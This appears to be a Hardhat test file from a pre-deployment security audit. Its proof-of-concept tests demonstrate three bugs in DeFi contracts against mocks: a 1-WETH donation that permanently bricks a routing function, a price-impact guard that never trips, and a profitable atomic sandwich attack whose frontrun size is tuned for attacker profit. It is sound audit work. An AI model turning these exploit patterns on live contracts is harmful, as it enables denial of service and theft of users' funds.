import { expect } from "chai";
import { ethers } from "hardhat";
import { takeSnapshot, type SnapshotRestorer } from "@nomicfoundation/hardhat-network-helpers";

/**
 * AUDIT PROOF-OF-CONCEPT — added by a pre-deployment security audit pass.
 * These tests are EXPECTED TO DEMONSTRATE BUGS. They are not regression
 * tests for intended behaviour.
 */
describe("AUDIT PoC — EnergyBus / adapters", () => {
  let snap: SnapshotRestorer;
  before(async () => {
    snap = await takeSnapshot();
  });
  after(async () => {
    await snap.restore();
  });

  const TIMELOCK = 48 * 3600;
  const SINK_BPS = 3_000n;

  // ────────────────────────────────────────────────────────────────────
  // PoC 1 — permanent route() DoS via an unsolicited WETH donation to any
  // adapter that refunds `weth.balanceOf(address(this))`.
  // ────────────────────────────────────────────────────────────────────
  it("PoC-1: 1 WETH donated to PlankBurnAdapter permanently bricks EnergyBus.route()", async () => {
    const [deployer, gov, attacker] = await ethers.getSigners();

    const weth: any = await (await ethers.getContractFactory("MockWeth")).deploy();
    const wethAddr = await weth.getAddress();

    const router: any = await (await ethers.getContractFactory("MockExternalSwapRouter")).deploy(
      ethers.parseEther("1")
    );

    const AdapterF = await ethers.getContractFactory("MockEnergyAdapter");
    const inv: any = await AdapterF.deploy(wethAddr);
    const clp: any = await AdapterF.deploy(wethAddr);
    const idx: any = await AdapterF.deploy(wethAddr);
    const plankLp: any = await AdapterF.deploy(wethAddr);
    const div: any = await AdapterF.deploy(wethAddr);

    // Predict the Bus address: PlankBurnAdapter is deployed at nonce N, the
    // Bus at nonce N+1.
    const n = await ethers.provider.getTransactionCount(deployer.address);
    const predictedBus = ethers.getCreateAddress({ from: deployer.address, nonce: n + 1 });

    const plankBurn: any = await (await ethers.getContractFactory("PlankBurnAdapter")).deploy(
      wethAddr,
      predictedBus,
      gov.address,
      0
    );
    const bus: any = await (await ethers.getContractFactory("EnergyBus")).deploy(
      wethAddr,
      [
        await inv.getAddress(),
        await clp.getAddress(),
        await idx.getAddress(),
        await plankBurn.getAddress(),
        await plankLp.getAddress(),
        await div.getAddress(),
      ],
      [3500n, 1500n, 1500n, 1000n, 1000n, 1500n]
    );
    expect(await bus.getAddress()).to.equal(predictedBus);

    // Configure the PLANK router (timelock delay 0) and make it fail — the
    // realistic "external venue reverts" state.
    await plankBurn.connect(gov).queueRouter(await router.getAddress());
    await plankBurn.executeRouter();
    await router.setMode(1); // REVERT

    // Baseline: route() works.
    await weth.mint(await bus.getAddress(), ethers.parseEther("1"));
    await expect(bus.route()).to.not.be.reverted;

    // ATTACK: attacker donates 1 WETH directly to the adapter address.
    await weth.mint(attacker.address, ethers.parseEther("1"));
    await weth.connect(attacker).transfer(await plankBurn.getAddress(), ethers.parseEther("1"));

    // Now every route() reverts (panic 0x11 underflow in _runPipe), forever.
    await weth.mint(await bus.getAddress(), ethers.parseEther("1"));
    await expect(bus.route()).to.be.reverted;
    await weth.mint(await bus.getAddress(), ethers.parseEther("5"));
    await expect(bus.route()).to.be.reverted;

    // And the funds pile up unreachable in an immutable contract with no
    // rescue function.
    expect(await weth.balanceOf(await bus.getAddress())).to.be.gt(0n);
  });

  // ────────────────────────────────────────────────────────────────────
  // PoC 2 — MAX_IMPACT_BPS never trips, at any trade size.
  // ────────────────────────────────────────────────────────────────────
  it("PoC-2: InventoryBuyAdapter buys at >80% price impact and MAX_IMPACT_BPS passes it", async () => {
    const [deployer, treasury, alice, busEoa] = await ethers.getSigners();

    const weth: any = await (await ethers.getContractFactory("MockWeth")).deploy();
    const wethAddr = await weth.getAddress();

    const nft: any = await (await ethers.getContractFactory("MockRobinWoodNft")).deploy();
    const factory: any = await (await ethers.getContractFactory("CollectionVaultFactory")).deploy(
      treasury.address,
      wethAddr,
      TIMELOCK
    );
    const vaultAddr: string = await factory.deployVault.staticCall(
      await nft.getAddress(),
      treasury.address,
      SINK_BPS
    );
    await factory.deployVault(await nft.getAddress(), treasury.address, SINK_BPS);
    const vault: any = await ethers.getContractAt("CollectionVault", vaultAddr);

    // Open the pool: 50 WETH / 1 S seeded.
    await weth.mint(alice.address, ethers.parseEther("500"));
    await weth.connect(alice).approve(vaultAddr, ethers.MaxUint256);
    for (let i = 1; i <= 3; i++) {
      await nft.mint(alice.address, i);
      await nft.connect(alice).approve(vaultAddr, i);
    }
    await vault.connect(alice).deposit(1);
    const seed = ethers.parseEther("50");
    await weth.mint(treasury.address, seed);
    await weth.connect(treasury).approve(vaultAddr, seed);
    await vault.connect(treasury).seedLiquidity(seed);
    await vault.connect(alice).transfer(treasury.address, ethers.parseEther("1"));
    await vault.connect(treasury).seedShares(ethers.parseEther("1"));
    await vault.connect(treasury).openPool();

    const wm: any = await (await ethers.getContractFactory("MockWeightModuleWeights")).deploy(
      vaultAddr,
      10_000n
    );
    const index: any = await (await ethers.getContractFactory("MockIndexEnergyCredit")).deploy();
    const adapter: any = await (await ethers.getContractFactory("InventoryBuyAdapter")).deploy(
      wethAddr,
      await index.getAddress(),
      busEoa.address,
      await wm.getAddress()
    );

    const pr0: bigint = await vault.paymentReserve();
    const sr0: bigint = await vault.shareReserve();

    // Adapter spends 500 WETH into a 50-WETH pool — a ~10x-reserve trade.
    const amount = ethers.parseEther("500");
    await weth.mint(busEoa.address, amount);
    await weth.connect(busEoa).transfer(await adapter.getAddress(), amount);
    const [used, skipped] = await adapter.connect(busEoa).execute.staticCall(amount);
    await adapter.connect(busEoa).execute(amount);

    // The guard did NOT trip: the leg filled.
    expect(skipped).to.equal(false);
    expect(used).to.equal(amount);

    const sharesBought: bigint = await vault.balanceOf(await index.getAddress());
    expect(sharesBought).to.be.gt(0n);

    // True price impact vs the PRE-TRADE spot price.
    const fairSharesAtSpot = (amount * sr0) / pr0;
    const impactBps = ((fairSharesAtSpot - sharesBought) * 10_000n) / fairSharesAtSpot;
    console.log(`   >> true price impact = ${impactBps} bps (MAX_IMPACT_BPS = 300)`);
    expect(impactBps).to.be.gt(8000n); // >80% impact, guard still passed
  });

  // ────────────────────────────────────────────────────────────────────
  // PoC 3 — atomic flash-loanable sandwich of Pipe I. Attacker needs no
  // capital of their own (buy S -> route() -> sell S, one tx).
  // ────────────────────────────────────────────────────────────────────
  it("PoC-3: sandwiching a permissionless route() is atomically profitable", async () => {
    const [deployer, treasury, alice, busEoa, attacker] = await ethers.getSigners();

    async function build() {
      const weth: any = await (await ethers.getContractFactory("MockWeth")).deploy();
      const wethAddr = await weth.getAddress();
      const nft: any = await (await ethers.getContractFactory("MockRobinWoodNft")).deploy();
      const factory: any = await (await ethers.getContractFactory("CollectionVaultFactory")).deploy(
        treasury.address,
        wethAddr,
        TIMELOCK
      );
      const vaultAddr: string = await factory.deployVault.staticCall(
        await nft.getAddress(),
        treasury.address,
        810n // FLOOR_SINK_SPLIT_BPS — attacker picks the cheapest sink
      );
      await factory.deployVault(await nft.getAddress(), treasury.address, 810n);
      const vault: any = await ethers.getContractAt("CollectionVault", vaultAddr);
      await weth.mint(alice.address, ethers.parseEther("100"));
      await weth.connect(alice).approve(vaultAddr, ethers.MaxUint256);
      for (let i = 1; i <= 3; i++) {
        await nft.mint(alice.address, i);
        await nft.connect(alice).approve(vaultAddr, i);
      }
      await vault.connect(alice).deposit(1);
      const seed = ethers.parseEther("10");
      await weth.mint(treasury.address, seed);
      await weth.connect(treasury).approve(vaultAddr, seed);
      await vault.connect(treasury).seedLiquidity(seed);
      await vault.connect(alice).transfer(treasury.address, ethers.parseEther("1"));
      await vault.connect(treasury).seedShares(ethers.parseEther("1"));
      await vault.connect(treasury).openPool();

      const wm: any = await (await ethers.getContractFactory("MockWeightModuleWeights")).deploy(
        vaultAddr,
        10_000n
      );
      const index: any = await (await ethers.getContractFactory("MockIndexEnergyCredit")).deploy();
      const adapter: any = await (await ethers.getContractFactory("InventoryBuyAdapter")).deploy(
        wethAddr,
        await index.getAddress(),
        busEoa.address,
        await wm.getAddress()
      );
      await weth.connect(attacker).approve(vaultAddr, ethers.MaxUint256);
      return { weth, vault, vaultAddr, adapter };
    }

    // Pipe I slice at MAX_ROUTE_WEI: 35% of 10 WETH = 3.5 WETH, into a 10 WETH pool.
    const victim = ethers.parseEther("3.5");
    let best = -1n;
    let bestSize = 0n;
    for (const frontrunEth of ["1", "2", "4", "8", "16"]) {
      const f = await build();
      const frontrun = ethers.parseEther(frontrunEth);
      await f.weth.mint(attacker.address, frontrun);
      const start: bigint = await f.weth.balanceOf(attacker.address);

      await f.vault.connect(attacker).buyShares(frontrun, 0n);
      const sHeld: bigint = await f.vault.balanceOf(attacker.address);

      await f.weth.mint(busEoa.address, victim);
      await f.weth.connect(busEoa).transfer(await f.adapter.getAddress(), victim);
      await f.adapter.connect(busEoa).execute(victim); // the permissionless route()

      await f.vault.connect(attacker).sellShares(sHeld, 0n);
      const end: bigint = await f.weth.balanceOf(attacker.address);
      const pnl = end - start;
      console.log(`   >> frontrun ${frontrunEth} WETH -> attacker PnL ${ethers.formatEther(pnl)} WETH`);
      if (pnl > best) {
        best = pnl;
        bestSize = frontrun;
      }
    }
    console.log(
      `   >> BEST: frontrun ${ethers.formatEther(bestSize)} WETH nets ${ethers.formatEther(best)} WETH per route()`
    );
    expect(best).to.be.gt(0n); // atomic, flash-loanable, repeatable every route
  });
});
